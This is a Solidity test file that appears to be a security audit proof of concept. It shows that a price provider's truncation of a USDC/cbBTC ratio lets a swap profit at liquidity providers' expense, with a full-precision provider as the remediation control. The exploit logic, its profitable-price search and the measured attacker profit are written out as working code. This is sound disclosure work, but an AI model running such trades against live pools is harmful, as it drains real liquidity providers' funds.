// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";
import {SafeCast} from "@openzeppelin/contracts/utils/math/SafeCast.sol";

import {MetricOmmPoolBaseTest, Q64} from "@metric-core-test/MetricOmmPool.base.t.sol";
import {MockERC20} from "@metric-core-test/mocks/MockERC20.sol";
import {MetricOmmPool} from "@metric-core/MetricOmmPool.sol";
import {MetricOmmPoolDeployer} from "@metric-core/MetricOmmPoolDeployer.sol";
import {MetricOmmPoolFactory} from "@metric-core/MetricOmmPoolFactory.sol";
import {IPriceProvider as IMetricPriceProvider} from "@metric-core/interfaces/IPriceProvider/IPriceProvider.sol";
import {PoolParameters} from "@metric-core/types/FactoryOperation.sol";
import {ExtensionOrders} from "@metric-core/types/PoolExtensionsConfig.sol";

import {AnchoredPriceProvider} from "smart-contracts-poc/contracts/AnchoredPriceProvider.sol";
import {AnchoredProviderFactory} from "smart-contracts-poc/contracts/AnchoredProviderFactory.sol";
import {IAnchoredProviderFactory} from "smart-contracts-poc/contracts/interfaces/IAnchoredProviderFactory.sol";
import {IOffchainOracle} from "smart-contracts-poc/contracts/interfaces/IOffchainOracle.sol";
import {IPricedOracle} from "smart-contracts-poc/contracts/interfaces/IPricedOracle.sol";
import {OracleBase} from "smart-contracts-poc/contracts/oracles/providers/OracleBase.sol";
import {toTimeMs} from "smart-contracts-poc/contracts/oracles/utils/TimeMs.sol";

/// @dev Concrete production OracleBase with deterministic fresh data. Signature verification is
///      orthogonal to this finding; all abuse-protection, registration, and attributed-read gates
///      remain the production implementation.
contract SyntheticRatioAuditOracle is OracleBase {
  constructor(address owner, uint256 maxTimeDrift) OracleBase(owner, maxTimeDrift) {}

  function setData(bytes32 feedId, uint64 price_, uint16 spread0_, uint256 refTimeSec) external {
    oracleData[feedId] = IOffchainOracle.OracleData({
      price: price_, spread0: spread0_, spread1: 0, timestampMs: toTimeMs(refTimeSec * 1000)
    });
  }
}

/// @dev Remediation control: preserves the full ratio directly in Q64.64 before applying exactly
///      the same additive uncertainty and minimum margin as AnchoredPriceProvider.
contract FullPrecisionSyntheticProvider is IMetricPriceProvider {
  uint256 private constant BPS_BASE = 1e18;
  uint256 private constant ONE_BPS = 1e14;
  uint16 private constant ORACLE_BPS = 10_000;

  IPricedOracle public immutable oracle;
  bytes32 public immutable baseFeedId;
  bytes32 public immutable quoteFeedId;
  uint256 public immutable minMargin;
  uint256 public immutable maxRefStaleness;
  uint16 public immutable maxSpreadBps;
  address private immutable _token0;
  address private immutable _token1;

  error FeedStalled();

  constructor(
    address oracle_,
    bytes32 baseFeedId_,
    bytes32 quoteFeedId_,
    uint256 minMargin_,
    uint256 maxRefStaleness_,
    uint16 maxSpreadBps_,
    address token0_,
    address token1_
  ) {
    oracle = IPricedOracle(oracle_);
    baseFeedId = baseFeedId_;
    quoteFeedId = quoteFeedId_;
    minMargin = minMargin_;
    maxRefStaleness = maxRefStaleness_;
    maxSpreadBps = maxSpreadBps_;
    _token0 = token0_;
    _token1 = token1_;
  }

  function token0() external view returns (address) {
    return _token0;
  }

  function token1() external view returns (address) {
    return _token1;
  }

  function getBidAndAskPrice() external returns (uint128 bid, uint128 ask) {
    (uint256 mid0, uint256 spread0, uint256 refTime0) = _readLeg(baseFeedId, msg.sender);
    (uint256 mid1, uint256 spread1, uint256 refTime1) = _readLeg(quoteFeedId, msg.sender);
    if (mid1 == 0 || spread0 + spread1 > maxSpreadBps || !_fresh(refTime0) || !_fresh(refTime1)) {
      revert FeedStalled();
    }

    uint256 half = (spread0 + spread1) * ONE_BPS + minMargin;
    uint256 midX64 = Math.mulDiv(mid0, Q64, mid1);
    uint256 bid256 = Math.mulDiv(midX64, BPS_BASE - half, BPS_BASE, Math.Rounding.Floor);
    uint256 ask256 = Math.mulDiv(midX64, BPS_BASE + half, BPS_BASE, Math.Rounding.Ceil);
    if (bid256 == 0 || ask256 > type(uint128).max || bid256 >= ask256) revert FeedStalled();
    return (uint128(bid256), uint128(ask256));
  }

  function _readLeg(bytes32 feedId, address targetPool) private returns (uint256 mid, uint256 spread, uint256 refTime) {
    (mid, spread,, refTime) = oracle.price(feedId, targetPool);
    if (mid == 0 || spread >= ORACLE_BPS) revert FeedStalled();
  }

  function _fresh(uint256 refTime) private view returns (bool) {
    return refTime != 0 && refTime <= block.timestamp && block.timestamp - refTime <= maxRefStaleness;
  }
}

/// @notice Production-composed proof of LP principal loss from synthetic-ratio truncation.
contract AnchoredSyntheticRatioPrecisionPoolAuditTest is MetricOmmPoolBaseTest {
  using SafeCast for uint256;

  bytes32 private constant USDC_USD = keccak256("USDC/USD");
  bytes32 private constant CBBTC_USD = keccak256("cbBTC/USD");
  bytes32 private constant MAJORS = keccak256("MAJORS");

  uint256 private constant USDC_USD8 = 1e8;
  // A correct price one cent above the $100,000 quantization boundary.
  uint256 private constant CBBTC_USD8 = 100_000 * 1e8 + 1e6;
  uint16 private constant LEG_SPREAD_BPS = 1;
  uint16 private constant MAX_SPREAD_BPS = 150;
  // The first-party Anchored tests use this 0.5 bps majors-style margin.
  uint256 private constant MIN_MARGIN = 5e13;
  uint24 private constant NOTIONAL_FEE_E8 = 50_000; // 5 bps

  uint256 private constant TOKEN0_SCALE = 1e12; // USDC: 6 external decimals -> 18 internal decimals
  uint256 private constant TOKEN1_SCALE = 1e10; // cbBTC: 8 external decimals -> 18 internal decimals
  uint256 private constant TOKEN_SCALE_RATIO = TOKEN0_SCALE / TOKEN1_SCALE;
  uint104 private constant LP_SHARES = 1e18;
  // A $50m one-sided bin is large but materially below the previous $1bn reproduction.
  uint256 private constant INITIAL_USDC_PER_SHARE_E18 = 50_000_000e6;
  uint256 private constant INITIAL_CBBTC_PER_SHARE_E18 = 1e8;

  SyntheticRatioAuditOracle private anchorOracle;
  AnchoredProviderFactory private anchoredFactory;
  AnchoredPriceProvider private truncatedProvider;
  FullPrecisionSyntheticProvider private fullPrecisionProvider;
  MetricOmmPoolFactory private metricFactory;
  MetricOmmPool private truncatedPool;
  MetricOmmPool private controlPool;

  struct Outcome {
    uint256 token0Out;
    uint256 token1In;
    uint256 externalBidProceeds;
    int256 attackerPnl;
    uint256 lpValueBefore;
    uint256 lpValueAfter;
    int256 lpPnl;
  }

  function setUp() public override {
    super.setUp();
    vm.warp(1_700_000_000);
    vm.deal(address(this), 1 ether);

    token0 = new MockERC20("USD Coin", "USDC", 6);
    token1 = new MockERC20("Coinbase Wrapped BTC", "cbBTC", 8);

    anchorOracle = new SyntheticRatioAuditOracle(address(this), 60);
    anchorOracle.setData(USDC_USD, uint64(USDC_USD8), LEG_SPREAD_BPS, block.timestamp);
    anchorOracle.setData(CBBTC_USD, uint64(CBBTC_USD8), LEG_SPREAD_BPS, block.timestamp);

    anchoredFactory = new AnchoredProviderFactory(address(this));
    anchoredFactory.addOracle(address(anchorOracle));
    anchoredFactory.setEnvelope(
      MAJORS,
      IAnchoredProviderFactory.Envelope({
        minMarginMin: 1e13,
        minMarginMax: 1e15,
        stalenessMin: 1,
        stalenessMax: 60,
        maxSpreadMin: 10,
        maxSpreadMax: 300,
        exists: false
      })
    );
    anchoredFactory.setFeedClass(USDC_USD, MAJORS);

    truncatedProvider = AnchoredPriceProvider(
      anchoredFactory.createAnchoredProvider(
        address(anchorOracle),
        USDC_USD,
        CBBTC_USD,
        MIN_MARGIN,
        60,
        MAX_SPREAD_BPS,
        false,
        0,
        address(token0),
        address(token1)
      )
    );
    fullPrecisionProvider = new FullPrecisionSyntheticProvider(
      address(anchorOracle), USDC_USD, CBBTC_USD, MIN_MARGIN, 60, MAX_SPREAD_BPS, address(token0), address(token1)
    );

    metricFactory = new MetricOmmPoolFactory(address(this));
    MetricOmmPoolDeployer productionDeployer = new MetricOmmPoolDeployer(address(metricFactory));
    metricFactory.setPoolDeployer(address(productionDeployer));
    metricFactory.setDefaultProtocolNotionalFeeE8(NOTIONAL_FEE_E8);

    truncatedPool = _createProductionPool(address(truncatedProvider), keccak256("truncated"));
    controlPool = _createProductionPool(address(fullPrecisionProvider), keccak256("full-precision"));

    anchorOracle.addApprovedFactory(address(metricFactory));
    _registerBothFeeds(address(truncatedPool));
    _registerBothFeeds(address(controlPool));

    for (uint256 i; i < callers.length; ++i) {
      token0.mint(address(callers[i]), 100_000_000e6);
      token1.mint(address(callers[i]), 2_000e8);
    }
    _approveUsersForPool(address(truncatedPool));
    _approveUsersForPool(address(controlPool));

    pool = truncatedPool;
    _addLiquidity(1, 0, 0, LP_SHARES, 0);
    pool = controlPool;
    _addLiquidity(3, 0, 0, LP_SHARES, 0);
    pool = truncatedPool;
  }

  function test_truncationCrossesExecutableBidWhileFullPrecisionControlDoesNot() public {
    uint256 truncatedMid8 = Math.mulDiv(USDC_USD8, 1e8, CBBTC_USD8);
    uint256 trueMidX64 = Math.mulDiv(USDC_USD8, Q64, CBBTC_USD8);
    uint256 truncatedMidX64 = Math.mulDiv(truncatedMid8, Q64, 1e8);
    uint256 rawErrorE8 = Math.mulDiv(trueMidX64 - truncatedMidX64, 1e8, trueMidX64);

    Outcome memory vulnerable = _executeAndMeasure(truncatedPool, 2);
    Outcome memory control = _executeAndMeasure(controlPool, 4);

    uint256 vulnerableLpLoss = uint256(-vulnerable.lpPnl);
    uint256 vulnerableLpLossBps = Math.mulDiv(vulnerableLpLoss, 10_000, vulnerable.lpValueBefore);
    uint256 attackerProfitRaw = uint256(vulnerable.attackerPnl);
    uint256 attackerProfitUsd8 = Math.mulDiv(attackerProfitRaw, CBBTC_USD8, 1e8);
    uint256 lpLossUsd8 = Math.mulDiv(vulnerableLpLoss, CBBTC_USD8, 1e18);
    uint256 vulnerableBucketLower8 = 100_000 * 1e8;
    uint256 vulnerableBucketUpper8 = Math.mulDiv(USDC_USD8, 1e8, truncatedMid8);
    uint256 maximumProfitableQuoteMid8 =
      _maximumProfitableQuoteMid8(vulnerable.token0Out, vulnerable.token1In, vulnerableBucketUpper8);
    uint256 profitableBucketFractionE8 = Math.mulDiv(
      maximumProfitableQuoteMid8 - vulnerableBucketLower8, 1e8, vulnerableBucketUpper8 - vulnerableBucketLower8
    );

    emit log_named_decimal_uint("fresh USDC/USD midpoint", USDC_USD8, 8);
    emit log_named_decimal_uint("fresh cbBTC/USD midpoint", CBBTC_USD8, 8);
    emit log_named_uint("synthetic midpoint after floor (8-decimal units)", truncatedMid8);
    emit log_named_decimal_uint("raw synthetic underpricing", rawErrorE8, 8);
    emit log_named_decimal_uint("USDC purchased", vulnerable.token0Out, 6);
    emit log_named_decimal_uint("cbBTC paid to vulnerable pool", vulnerable.token1In, 8);
    emit log_named_decimal_uint("cbBTC received at conservative external bid", vulnerable.externalBidProceeds, 8);
    emit log_named_decimal_uint("attacker profit at external bid (cbBTC)", attackerProfitRaw, 8);
    emit log_named_decimal_uint("attacker profit at external bid (USD)", attackerProfitUsd8, 8);
    emit log_named_decimal_uint("LP principal loss at external bid (USD)", lpLossUsd8, 8);
    emit log_named_uint("LP principal loss (bps)", vulnerableLpLossBps);
    emit log_named_int("control attacker PnL (cbBTC raw)", control.attackerPnl);
    emit log_named_int("control LP PnL (18-decimal cbBTC)", control.lpPnl);
    emit log_named_decimal_uint("maximum profitable cbBTC/USD midpoint", maximumProfitableQuoteMid8, 8);
    emit log_named_decimal_uint("profitable fraction of this quantization bucket", profitableBucketFractionE8, 8);
    emit log_named_decimal_uint("previous $100,001 scenario", 100_001e8, 8);

    assertTrue(anchoredFactory.isProvider(address(truncatedProvider)), "real provider factory recognizes provider");
    assertTrue(metricFactory.isPool(address(truncatedPool)), "real Metric factory recognizes vulnerable pool");
    assertGt(vulnerable.attackerPnl, 0, "truncated quote is profitably crossed against executable bid");
    assertGt(attackerProfitUsd8, 10e8, "attacker profit exceeds $10 before gas");
    assertLt(vulnerable.lpPnl, 0, "LP loses principal at the executable bid");
    assertGt(vulnerableLpLossBps, 1, "LP loss exceeds the 0.01% Medium threshold");
    assertGt(lpLossUsd8, 10e8, "LP loss exceeds $10");
    assertLt(control.attackerPnl, 0, "same trade is unprofitable with full-precision ratio");
    assertGe(control.lpPnl, 0, "full-precision pool does not lose principal at executable bid");
    assertLe(CBBTC_USD8, maximumProfitableQuoteMid8, "selected fresh price is inside the vulnerable window");
    assertGt(100_001e8, maximumProfitableQuoteMid8, "the previous report's price is outside the window");
    assertLt(profitableBucketFractionE8, 2e5, "window is below 0.2% of this quantization bucket");
  }

  function _executeAndMeasure(MetricOmmPool target, uint256 attackerIndex) private returns (Outcome memory outcome) {
    pool = target;
    (uint104 token0Before, uint104 token1Before,,,) = _getBinState(0);
    outcome.lpValueBefore = _valueAtExecutableBid(token0Before, token1Before);

    uint128 requestedToken0 = Math.mulDiv(uint256(token0Before), 99, 100 * TOKEN0_SCALE).toUint128();
    (int256 amount0Delta, int256 amount1Delta) = _swapOnPool(
      address(target), attackerIndex, users[attackerIndex], false, _i128ExactOut(requestedToken0), type(uint128).max
    );

    (uint104 token0After, uint104 token1After,,,) = _getBinState(0);
    outcome.lpValueAfter = _valueAtExecutableBid(token0After, token1After);
    outcome.lpPnl = int256(outcome.lpValueAfter) - int256(outcome.lpValueBefore);
    outcome.token0Out = uint256(-amount0Delta);
    outcome.token1In = uint256(amount1Delta);
    outcome.externalBidProceeds = _externalBidValueRaw(outcome.token0Out);
    outcome.attackerPnl = int256(outcome.externalBidProceeds) - int256(outcome.token1In);
  }

  function _valueAtExecutableBid(uint104 token0Scaled, uint104 token1Scaled) private pure returns (uint256) {
    (uint256 baseBid8, uint256 quoteAsk8) = _externalBidLegs();
    return Math.mulDiv(uint256(token0Scaled), baseBid8, quoteAsk8) + uint256(token1Scaled);
  }

  function _externalBidValueRaw(uint256 token0Raw) private pure returns (uint256) {
    (uint256 baseBid8, uint256 quoteAsk8) = _externalBidLegs();
    return Math.mulDiv(token0Raw, baseBid8 * TOKEN_SCALE_RATIO, quoteAsk8, Math.Rounding.Floor);
  }

  function _externalBidLegs() private pure returns (uint256 baseBid8, uint256 quoteAsk8) {
    baseBid8 = Math.mulDiv(USDC_USD8, 10_000 - LEG_SPREAD_BPS, 10_000, Math.Rounding.Floor);
    quoteAsk8 = Math.mulDiv(CBBTC_USD8, 10_000 + LEG_SPREAD_BPS, 10_000, Math.Rounding.Ceil);
  }

  function _maximumProfitableQuoteMid8(uint256 token0Out, uint256 token1In, uint256 bucketUpper8)
    private
    pure
    returns (uint256 low)
  {
    low = 100_000 * 1e8 + 1;
    uint256 high = bucketUpper8;
    uint256 baseBid8 = Math.mulDiv(USDC_USD8, 10_000 - LEG_SPREAD_BPS, 10_000, Math.Rounding.Floor);
    while (low < high) {
      uint256 candidate = (low + high + 1) / 2;
      uint256 quoteAsk8 = Math.mulDiv(candidate, 10_000 + LEG_SPREAD_BPS, 10_000, Math.Rounding.Ceil);
      uint256 proceeds = Math.mulDiv(token0Out, baseBid8 * TOKEN_SCALE_RATIO, quoteAsk8, Math.Rounding.Floor);
      if (proceeds > token1In) low = candidate;
      else high = candidate - 1;
    }
  }

  function _createProductionPool(address provider, bytes32 salt) private returns (MetricOmmPool) {
    uint256[] memory nonNegativeBins = _createBinDataArray();
    uint256[] memory negativeBins = _createBinDataArray();
    address[] memory extensions = new address[](0);
    bytes[] memory extensionInitData = new bytes[](0);
    ExtensionOrders memory extensionOrders;

    return MetricOmmPool(
      metricFactory.createPool(
        PoolParameters({
          token0: address(token0),
          token1: address(token1),
          priceProvider: provider,
          extensions: extensions,
          extensionOrders: extensionOrders,
          extensionInitData: extensionInitData,
          priceProviderTimelock: type(uint256).max,
          admin: address(this),
          initialAmount0PerShareE18: INITIAL_USDC_PER_SHARE_E18,
          initialAmount1PerShareE18: INITIAL_CBBTC_PER_SHARE_E18,
          minimalMintableLiquidity: MINIMAL_MINTABLE_LIQUIDITY,
          adminSpreadFeeE6: 0,
          adminNotionalFeeE8: 0,
          adminFeeDestination: adminFeeDestination,
          curBinDistFromProvidedPriceE6: 0,
          nonNegativeBinDataArray: nonNegativeBins,
          negativeBinDataArray: negativeBins,
          salt: salt
        })
      )
    );
  }

  function _registerBothFeeds(address targetPool) private {
    anchorOracle.register{value: 1}(USDC_USD, targetPool, address(metricFactory));
    anchorOracle.register{value: 1}(CBBTC_USD, targetPool, address(metricFactory));
  }
}
